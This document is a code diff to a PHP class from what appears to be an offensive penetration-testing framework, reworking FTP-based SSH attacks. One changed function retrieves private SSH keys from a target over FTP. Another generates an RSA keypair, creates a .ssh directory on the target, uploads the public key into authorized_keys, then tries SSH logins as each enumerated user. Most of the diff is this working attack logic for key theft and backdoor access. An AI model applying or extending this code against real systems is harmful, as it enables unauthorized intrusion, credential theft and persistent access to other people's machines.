@@ -100,7 +100,7 @@ class check4linux8protocol extends AUTH{
             if ($dirname!=="." && $dirname!==".." && !empty($dirname) ){
                 $tab_dir_path[] = $dirname;
                 $this->article("dir test", $dirname);
-                ftp_chdir($ftp_stream,  "$base$dirname");
+                ftp_chdir($ftp_stream,  "$base/$dirname");
                 $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                 echo $this->tab($ftp_rawlist_dir);
                 foreach ($ftp_rawlist_dir as $v) {
@@ -116,7 +116,7 @@ class check4linux8protocol extends AUTH{
                         $info['day'] = $vinfo[6];
                         $info['time'] = $vinfo[7];
                         $info['name'] = $vinfo[8];
-                        $info['path'] = "$base$dirname".$vinfo[8];
+                        $info['path'] = "$base/$dirname".$vinfo[8];
                         $rawlist[$info['name']] = $info;
                     }
                 }
@@ -134,8 +134,8 @@ class check4linux8protocol extends AUTH{
     
     public function ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
         $this->ssTitre(__FUNCTION__);
-        $this->ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
-        //$this->ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
+        $this->ftp2keys2getPriv($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);$this->pause();
+        $this->ftp2keys2addPub($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);$this->pause();
         
     }
     
@@ -148,7 +148,7 @@ class check4linux8protocol extends AUTH{
     
     
     
-    public function ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
+    public function ftp2keys2getPriv($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
         $this->ssTitre(__FUNCTION__);
         $result = "";
         $private_keys_str = "";
@@ -196,7 +196,7 @@ class check4linux8protocol extends AUTH{
                     $this->pause();
 
                     
-                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
+                    $this->key2pentest8attacker("",$remote_username_ftp,$private_keys_str,$ssh_open,$type_crypt);
                 }
                 $this->pause();
             }
@@ -210,7 +210,7 @@ class check4linux8protocol extends AUTH{
     
     
     
-    public function ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
+    public function ftp2keys2addPub($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
         $this->ssTitre(__FUNCTION__);
         $result = "";
         
@@ -242,28 +242,31 @@ class check4linux8protocol extends AUTH{
                 $type_crypt = "rsa";
                 $private_keys_str = $this->key2gen4priv2str("",$type_crypt);
                 $public_authorized_keys_str2use = $this->key2gen4public2str("",$private_keys_str,$type_crypt);
-                
+                $this->pause();
 
                 
                 if (empty($remote_authorized_keys_filepath)){
                     
-                    ftp_mkdir($ftp_stream, "$racine_ftp.ssh");
+                    ftp_mkdir($ftp_stream, "$racine_ftp/.ssh");
                     
                     $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
                     echo $this->tab($ftp_rawlist_racine);
                     
                     $tmp = ftp_rawlist($ftp_stream, "$racine_ftp",TRUE);
-                    if (!$tmp) echo $tmp ;
+                    if (!$tmp) echo $this->tab($tmp) ;
                     
-                    $query = "echo '$public_authorized_keys_str2use' >> /tmp/authorized_keys";
-                    $this->requette($query);
-                    ftp_put($ftp_stream, "$racine_ftp.ssh/authorized_keys", "/tmp/authorized_keys", FTP_ASCII);
+                    $hash = sha1($private_keys_str);
+                    $file_path = "/tmp/$hash.pub";
+                    
+                    //$this->requette("cat $file_path");
+
+                    ftp_put($ftp_stream, "$racine_ftp/.ssh/authorized_keys", "$file_path", FTP_ASCII);
                     
                     
-                    var_dump(ftp_rawlist($ftp_stream, "$racine_ftp.ssh/",TRUE));
-                    if (!$tmp) echo $tmp ;
-                    
-                    ftp_chdir($ftp_stream,"$racine_ftp.ssh/");
+                    //var_dump(ftp_rawlist($ftp_stream, "$racine_ftp/.ssh/",TRUE));
+                    if (!$tmp) echo $this->tab($tmp) ;
+                    $this->pause();
+                    ftp_chdir($ftp_stream,"$racine_ftp/.ssh/");
                     $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
                     $files_list_str = $this->tab($ftp_rawlist_racine);
                     echo $files_list_str;
@@ -277,9 +280,10 @@ class check4linux8protocol extends AUTH{
                 
                 if (!empty($remote_authorized_keys_filepath)){
                     $this->article("FTP GET", $remote_authorized_keys_filepath);
-                    ftp_get($ftp_stream, "/tmp/authorized_keys_get",$remote_authorized_keys_filepath, FTP_ASCII);
+
+                    ftp_get($ftp_stream, "/tmp/$this->ip.$this->port.authorized_keys",$remote_authorized_keys_filepath, FTP_ASCII);
                     
-                    $query = "cat /tmp/authorized_keys_get";
+                    $query = "cat /tmp/$this->ip.$this->port.authorized_keys";
                     $public_keys_found = trim($this->req_ret_str($query));
                     $this->pause();
                     
@@ -301,9 +305,13 @@ class check4linux8protocol extends AUTH{
                     $this->pause();
                     
                     // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
+                    $tab_users = $this->ip2users4shell();
+                    foreach ($tab_users as $user){
+                        $this->article("Try with user", $user);
+                        $this->key2pentest8attacker("",$user,$private_keys_str,$ssh_open,$type_crypt);
+                    $this->pause();
                     
-                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
-                    
+                    }
                     
                     
                     
@@ -344,7 +352,7 @@ class check4linux8protocol extends AUTH{
                 $info['day'] = $vinfo[6];
                 $info['time'] = $vinfo[7];
                 $info['name'] = $vinfo[8];
-                $info['path'] = "$base".$vinfo[8];
+                $info['path'] = "$base/".$vinfo[8];
                 $rawlist[$info['name']] = $info;
             }
         }
@@ -377,7 +385,7 @@ class check4linux8protocol extends AUTH{
                         $info['day'] = $vinfo[6];
                         $info['time'] = $vinfo[7];
                         $info['name'] = $vinfo[8];
-                        $info['path'] = "$base$dirname/".$vinfo[8];
+                        $info['path'] = "$base/$dirname/".$vinfo[8];
                         $rawlist[$info['name']] = $info;
                     }
                 }
